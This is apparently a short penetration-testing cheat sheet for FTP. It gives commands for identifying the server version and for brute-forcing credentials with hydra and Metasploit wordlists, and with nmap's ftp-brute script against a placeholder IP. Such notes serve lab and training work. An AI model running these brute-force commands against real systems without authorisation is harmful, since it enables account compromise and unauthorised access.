##### Find FTP Server's Version
```
# First method
ftp IP

# Second method
nmap -sV IP
```

##### Brute Force Username and the Password using Wordlists
```
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ftp://IP
```

##### Brute Force using Nmap
```
# We found user 'sysadmin' from earlier Brute Force using Hydra. 
echo 'sysadmin' > users
nmap -p21 --script ftp-brute --script-args userdb=/root/users IP
```